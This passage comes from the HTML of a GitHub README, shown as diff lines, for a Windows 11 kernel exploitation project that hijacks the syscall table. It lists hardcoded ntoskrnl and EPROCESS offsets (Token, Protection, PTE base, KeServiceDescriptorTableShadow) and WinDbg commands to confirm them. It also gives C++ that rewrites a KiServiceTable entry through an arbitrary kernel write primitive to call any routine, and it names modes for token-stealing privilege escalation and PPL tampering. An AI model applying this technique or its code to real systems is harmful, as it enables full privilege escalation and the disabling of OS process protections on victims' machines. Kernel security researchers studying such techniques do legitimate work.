1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">The project splits offsets into two groups: <strong>dynamic</strong> (resolved at runtime, no edit needed) and <strong>manual</strong> (must be confirmed in WinDbg for your kernel build).</p>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">✅ Dynamic — handled automatically by <code>kernelHelper::resolveKernelArtifacts()</code></h4><a id="user-content--dynamic--handled-automatically-by-kernelhelperresolvekernelartifacts" class="anchor" aria-label="Permalink: ✅ Dynamic — handled automatically by kernelHelper::resolveKernelArtifacts()" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-dynamic--handled-automatically-by-kernelhelperresolvekernelartifacts"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Item</th>
+<th>How it's resolved</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>NtSetQuotaInformationFile</code> syscall #</td>
+<td>Read the 4 bytes after <code>B8</code> in the <code>ntdll!NtSetQuotaInformationFile</code> prologue (<code>4C 8B D1  B8 ?? ?? ?? ??</code>).</td>
+</tr>
+<tr>
+<td><code>nt!PsLookupProcessByProcessId</code> address</td>
+<td><code>LoadLibraryEx("ntoskrnl.exe", DONT_RESOLVE_DLL_REFERENCES)</code> + <code>GetProcAddress</code> + (kernel base + RVA).</td>
+</tr>
+<tr>
+<td><code>nt!memcpy</code> address (used by <code>/privesc</code> and <code>/ppl</code>)</td>
+<td>Same trick.</td>
+</tr>
+<tr>
+<td><code>ntoskrnl.exe</code> base</td>
+<td><code>EnumDeviceDrivers</code> (requires SYSTEM on modern Win11).</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">If any dynamic lookup fails, the code falls back to the hardcoded values in <code>offsets.h</code>.</p>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto"><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Manual — verify in WinDbg before running</h4><a id="user-content-️-manual--verify-in-windbg-before-running" class="anchor" aria-label="Permalink: ⚠️ Manual — verify in WinDbg before running" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#%EF%B8%8F-manual--verify-in-windbg-before-running"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">These cannot be resolved dynamically (not exported, or struct layouts). Wrong values will <strong>BSOD</strong> the box.</p>
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-c"><span class="pl-c">//</span> kd&gt; ? nt!KeServiceDescriptorTableShadow - nt</span>
+#<span class="pl-k">define</span> <span class="pl-en">KeServiceDescriptorTableShadow_Offset_fromNT</span> <span class="pl-c1">0xfc6280</span>
+
+<span class="pl-c"><span class="pl-c">//</span> PTE_BASE pointer lives at (MiGetPteAddress + 0x13) inside ntoskrnl.</span>
+<span class="pl-c"><span class="pl-c">//</span> kd&gt; ? (nt!MiGetPteAddress + 0x13) - nt</span>
+#<span class="pl-k">define</span> <span class="pl-en">MiGetPteAddress_Offset_fromNT</span> <span class="pl-c1">0x4336e3</span>
+
+<span class="pl-c"><span class="pl-c">//</span> kd&gt; dt nt!_EPROCESS ImageFileName</span>
+#<span class="pl-k">define</span> <span class="pl-en">imageFileNameOffset</span> <span class="pl-c1">0x338</span>
+
+<span class="pl-c"><span class="pl-c">//</span> kd&gt; dt nt!_EPROCESS Token</span>
+<span class="pl-c"><span class="pl-c">//</span> EX_FAST_REF — low 4 bits = cached ref count, upper bits = token pointer.</span>
+#<span class="pl-k">define</span> <span class="pl-en">tokenOffset</span> <span class="pl-c1">0x4b8</span>
+
+<span class="pl-c"><span class="pl-c">//</span> kd&gt; dt nt!_EPROCESS Protection</span>
+<span class="pl-c"><span class="pl-c">//</span> _PS_PROTECTION (1 byte): Type bits 0..2, Audit bit 3, Signer bits 4..7.</span>
+<span class="pl-c"><span class="pl-c">//</span> Only needed if you use /ppl.</span>
+#<span class="pl-k">define</span> <span class="pl-en">protectionOffset</span> <span class="pl-c1">0x6fa</span></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="// kd> ? nt!KeServiceDescriptorTableShadow - nt
+#define KeServiceDescriptorTableShadow_Offset_fromNT 0xfc6280
+
+// PTE_BASE pointer lives at (MiGetPteAddress + 0x13) inside ntoskrnl.
+// kd> ? (nt!MiGetPteAddress + 0x13) - nt
+#define MiGetPteAddress_Offset_fromNT 0x4336e3
+
+// kd> dt nt!_EPROCESS ImageFileName
+#define imageFileNameOffset 0x338
+
+// kd> dt nt!_EPROCESS Token
+// EX_FAST_REF — low 4 bits = cached ref count, upper bits = token pointer.
+#define tokenOffset 0x4b8
+
+// kd> dt nt!_EPROCESS Protection
+// _PS_PROTECTION (1 byte): Type bits 0..2, Audit bit 3, Signer bits 4..7.
+// Only needed if you use /ppl.
+#define protectionOffset 0x6fa" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">🧪 One paste-block to verify everything before running</h4><a id="user-content--one-paste-block-to-verify-everything-before-running" class="anchor" aria-label="Permalink: 🧪 One paste-block to verify everything before running" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-one-paste-block-to-verify-everything-before-running"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">This is the full WinDbg pre-flight checklist for the project. Paste it into your live-kernel session against the same <code>ntoskrnl.exe</code> the binary will run against — every line in the output corresponds to one <code>#define</code> in <code>offsets.h</code>.</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>kd&gt; ? nt!KeServiceDescriptorTableShadow - nt
+kd&gt; ? (nt!MiGetPteAddress + 0x13) - nt
+kd&gt; dt nt!_EPROCESS ImageFileName Token Protection
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="kd> ? nt!KeServiceDescriptorTableShadow - nt
+kd> ? (nt!MiGetPteAddress + 0x13) - nt
+kd> dt nt!_EPROCESS ImageFileName Token Protection" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">What you should see, and which <code>#define</code> each line feeds:</p>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>WinDbg output</th>
+<th>Maps to <code>offsets.h</code> define</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Evaluate expression: &lt;hex&gt; = </code> from line 1</td>
+<td><code>KeServiceDescriptorTableShadow_Offset_fromNT</code></td>
+</tr>
+<tr>
+<td><code>Evaluate expression: &lt;hex&gt; = </code> from line 2</td>
+<td><code>MiGetPteAddress_Offset_fromNT</code></td>
+</tr>
+<tr>
+<td><code>+0x??? ImageFileName</code></td>
+<td><code>imageFileNameOffset</code>   <em>(all three demos)</em></td>
+</tr>
+<tr>
+<td><code>+0x??? Token</code></td>
+<td><code>tokenOffset</code>           <em>(<code>/privesc</code>)</em></td>
+</tr>
+<tr>
+<td><code>+0x??? Protection</code></td>
+<td><code>protectionOffset</code>      <em>(<code>/ppl</code> only)</em></td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">If any value differs from the <code>offsets.h</code> constant currently checked in, <strong>edit <code>offsets.h</code> before rebuilding</strong> — every one of these is a BSOD vector if wrong on a live kernel.</p>
+<p dir="auto">Bonus: if you also want to confirm the runtime-resolved items aren't drifting (e.g. you suspect a Windows update changed something), the WinDbg one-liners are:</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>kd&gt; u ntdll!NtSetQuotaInformationFile L1   ; first instruction; the syscall # is the imm32 after `mov eax`
+kd&gt; ? nt!PsLookupProcessByProcessId - nt
+kd&gt; ? nt!memcpy - nt
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="kd> u ntdll!NtSetQuotaInformationFile L1   ; first instruction; the syscall # is the imm32 after `mov eax`
+kd> ? nt!PsLookupProcessByProcessId - nt
+kd> ? nt!memcpy - nt" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">You shouldn't need to edit anything for these — they're resolved at runtime from <code>ntdll</code> / <code>ntoskrnl</code> exports — but it's a quick sanity check before you trust the <code>[&gt;]</code> resolution lines the binary prints on startup.</p>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🧬 Generalizing the hijack — calling any API with any arity</h3><a id="user-content--generalizing-the-hijack--calling-any-api-with-any-arity" class="anchor" aria-label="Permalink: 🧬 Generalizing the hijack — calling any API with any arity" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-generalizing-the-hijack--calling-any-api-with-any-arity"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">There are two pieces here: <strong>the table entry</strong> (how the kernel finds the routine to call), and <strong>the arguments</strong> (how data gets from your <code>((PFN_HSC_N)HijackedSyscall)(...)</code> C++ call all the way into the hijacked routine's registers and stack). They're independent — the entry tells the kernel <em>what to call</em>, the calling convention tells it <em>what to pass</em>.</p>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">The <code>KiServiceTable</code> entry — a packed 32-bit DWORD</h4><a id="user-content-the-kiservicetable-entry--a-packed-32-bit-dword" class="anchor" aria-label="Permalink: The KiServiceTable entry — a packed 32-bit DWORD" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#the-kiservicetable-entry--a-packed-32-bit-dword"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code> 31                                            4 │ 3        0
+┌─────────────────────────────────────────────────┼────────────┐
+│   signed byte offset from KiServiceTable        │  stackArgs │
+│   (routine_addr − KiServiceTable)               │            │
+└─────────────────────────────────────────────────┴────────────┘
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value=" 31                                            4 │ 3        0
+┌─────────────────────────────────────────────────┼────────────┐
+│   signed byte offset from KiServiceTable        │  stackArgs │
+│   (routine_addr − KiServiceTable)               │            │
+└─────────────────────────────────────────────────┴────────────┘" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<ul dir="auto">
+<li><strong>Bits 4..31</strong> — <code>(routine_addr − KiServiceTable)</code> shifted <em>left</em> by 4. The kernel reads them back with an arithmetic shift right by 4, so the offset is treated as signed (the routine can sit below the table, though in practice it doesn't).</li>
+<li><strong>Bits 0..3</strong> — <code>stackArgs</code>, the count of 8-byte arguments <strong>beyond</strong> the 4 register args. So a 2-arg or 4-arg routine → 0. A 7-arg routine → 3. An 8-arg routine → 4.</li>
+</ul>
+<p dir="auto"><code>pointSyscallTo(addr, stackArgs)</code> builds this DWORD and writes it via the R/W primitive:</p>
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-c1">DWORD</span> entry = ((<span class="pl-c1">DWORD</span>)(routine_addr - KiServiceTable) &lt;&lt; <span class="pl-c1">4</span>) | (stackArgs &amp; <span class="pl-c1">0xF</span>);
+<span class="pl-en">WriteMemoryPrimitive</span>(<span class="pl-c1">4</span>, KiServiceTable + syscallNum*<span class="pl-c1">4</span>, entry);</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="DWORD entry = ((DWORD)(routine_addr - KiServiceTable) << 4) | (stackArgs &amp; 0xF);
+WriteMemoryPrimitive(4, KiServiceTable + syscallNum*4, entry);" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">How arguments flow into the hijacked routine</h4><a id="user-content-how-arguments-flow-into-the-hijacked-routine" class="anchor" aria-label="Permalink: How arguments flow into the hijacked routine" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#how-arguments-flow-into-the-hijacked-routine"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Microsoft x64 ABI everywhere — same convention in user mode, in the asm stub, and in the kernel-side handler. The only twist is the <code>syscall</code> instruction in the middle, which the asm stub bridges.</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>┌─── User mode ───────────────────────────────────────────────────────────┐
+│                                                                         │
+│  ((PFN_HSC_3)HijackedSyscall)(a, b, c);                                 │
+│                                                                         │
+│  Compiler emits (Microsoft x64 ABI):                                    │
+│      RCX = a                                                            │
+│      RDX = b                                                            │
+│      R8  = c                                                            │
+│      R9  = arg4   (if present)                                          │
+│      [rsp+0x28]   = arg5  ┐                                             │
+│      [rsp+0x30]   = arg6  │  (caller's frame, after the                 │
+│      [rsp+0x38]   = arg7  │   call instruction's return-addr push)      │
+│      ...                  ┘                                             │
+│                                                                         │
+│  HijackedSyscall asm stub:                                              │
+│      mov  r10, rcx           ; SYSCALL clobbers RCX with return addr,   │
+│                              ; so arg1 is staged in R10 first           │
+│      mov  eax, syscallNumber ; resolved syscall # of NtSetQuotaInfoFile │
+│      syscall                 ; CPU: R11=RFLAGS, RCX=RIP, RIP=LSTAR      │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+                                  │
+                                  ▼  (mode switch via SYSCALL)
+┌─── Kernel mode ─────────────────────────────────────────────────────────┐
+│                                                                         │
+│  nt!KiSystemCall64:                                                     │
+│      • switches to kernel stack, builds trap frame, saves user state    │
+│      • reads EAX (syscall #)                                            │
+│      • fetches entry = KiServiceTable[EAX]                              │
+│      • decodes:  routine     = KiServiceTable + (entry &gt;&gt; 4)            │
+│                  stack_args  = entry &amp; 0xF                              │
+│      • if stack_args &gt; 0, KiSystemServiceCopyEnd copies stack_args*8    │
+│        bytes from the user stack ([user_rsp+0x28]…) onto the kernel     │
+│        stack at the same offset (so [k_rsp+0x28]… is identical to       │
+│        what the caller staged)                                          │
+│      • restores RCX from R10  (RCX = a again)                           │
+│      • calls routine(RCX, RDX, R8, R9, [rsp+0x28]…)                     │
+│                                                                         │
+│  The hijacked routine sees:                                             │
+│      RCX = a, RDX = b, R8 = c, R9 = arg4,                               │
+│      [rsp+0x28]+ = whatever stack args the caller staged                │
+│  — identical to a direct kernel call. No fix-ups needed.                │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="┌─── User mode ───────────────────────────────────────────────────────────┐
+│                                                                         │
+│  ((PFN_HSC_3)HijackedSyscall)(a, b, c);                                 │
+│                                                                         │
+│  Compiler emits (Microsoft x64 ABI):                                    │
+│      RCX = a                                                            │
+│      RDX = b                                                            │
+│      R8  = c                                                            │
+│      R9  = arg4   (if present)                                          │
+│      [rsp+0x28]   = arg5  ┐                                             │
+│      [rsp+0x30]   = arg6  │  (caller's frame, after the                 │
+│      [rsp+0x38]   = arg7  │   call instruction's return-addr push)      │
+│      ...                  ┘                                             │
+│                                                                         │
+│  HijackedSyscall asm stub:                                              │
+│      mov  r10, rcx           ; SYSCALL clobbers RCX with return addr,   │
+│                              ; so arg1 is staged in R10 first           │
+│      mov  eax, syscallNumber ; resolved syscall # of NtSetQuotaInfoFile │
+│      syscall                 ; CPU: R11=RFLAGS, RCX=RIP, RIP=LSTAR      │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+                                  │
+                                  ▼  (mode switch via SYSCALL)
+┌─── Kernel mode ─────────────────────────────────────────────────────────┐
+│                                                                         │
+│  nt!KiSystemCall64:                                                     │
+│      • switches to kernel stack, builds trap frame, saves user state    │
+│      • reads EAX (syscall #)                                            │
+│      • fetches entry = KiServiceTable[EAX]                              │
+│      • decodes:  routine     = KiServiceTable + (entry >> 4)            │
+│                  stack_args  = entry &amp; 0xF                              │
+│      • if stack_args > 0, KiSystemServiceCopyEnd copies stack_args*8    │
+│        bytes from the user stack ([user_rsp+0x28]…) onto the kernel     │
+│        stack at the same offset (so [k_rsp+0x28]… is identical to       │
+│        what the caller staged)                                          │
+│      • restores RCX from R10  (RCX = a again)                           │
